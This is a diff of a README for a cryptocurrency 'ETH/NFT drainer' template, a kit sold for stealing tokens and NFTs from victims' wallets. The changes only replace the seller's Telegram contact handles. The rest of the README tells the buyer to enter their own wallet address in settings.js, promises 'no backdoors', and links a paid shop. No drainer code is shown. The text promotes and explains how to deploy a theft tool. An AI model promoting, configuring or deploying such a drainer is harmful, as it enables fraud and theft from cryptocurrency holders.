@@ -1,5 +1,5 @@
 # ***⛔ This Code Has No Backdoors!***
-### If you need any help, DM me here: [@anondrainers](https://t.me/anondrainers) (new telegram)
+### If you need any help, DM me here: [@draingold](https://t.me/draingold)
 
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
@@ -19,12 +19,12 @@
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 
-To get instant support, contact me on [@anondrainers](https://t.me/anondrainers)
+To get instant support, contact me on [@draingold](https://t.me/draingold)
 
 
 ## `⭐ Socials :`
 
-- Telegram: [@anondrainers](https://t.me/anondrainers)
+- Telegram: [@draingold](https://t.me/draingold)
 - Shop: https://tecdrainers.sellix.io
 
 ##### Please ⭐ the repo to support our project
